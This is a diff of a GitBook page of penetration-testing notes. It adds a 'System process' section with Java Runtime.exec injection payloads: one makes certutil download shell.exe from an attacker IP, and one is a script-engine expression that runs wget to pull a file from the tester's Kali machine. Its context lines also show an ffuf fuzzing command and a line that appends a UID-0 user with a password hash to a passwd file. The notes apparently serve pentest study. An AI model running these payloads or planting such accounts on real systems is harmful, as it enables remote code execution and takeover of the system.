@@ -6,7 +6,7 @@
 
 `ffuf -request request.txt -request-proto http -w ../../scripts/num.txt:HFUZZ -w ../../scripts/charlist.txt:WFUZZ -fw 73`
 
-<div align="left"><figure><img src="../../.gitbook/assets/image (6) (1).png" alt="" width="506"><figcaption></figcaption></figure></div>
+<div align="left"><figure><img src="../../.gitbook/assets/image (6) (1) (1).png" alt="" width="506"><figcaption></figcaption></figure></div>
 
 ```bash
 cat output | grep '*' > newoutput
@@ -89,6 +89,16 @@ echo 'poopenheimer:$1$KV6ZXL5Y$cCWKY7ne0OdophMjXuNeO/:0:0::/root:/bin/bash' >> /
 ```
 
 <figure><img src="../../.gitbook/assets/1_tE3zHQuac60ARyBedQ0IrA.webp" alt=""><figcaption></figcaption></figure>
+
+### System process
+
+{% code overflow="wrap" %}
+```
+java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -urlcache -split -f http://192.168.45.187/shell.exe C:/Windows/Temp/shell.exe"
+
+query=${script:javascript:java.lang.Runtime.getRuntime().exec('wget YOUR_KALI_IP/YOURFILE -O /tmp/YOURFILE')}
+```
+{% endcode %}
 
 ## Web
 
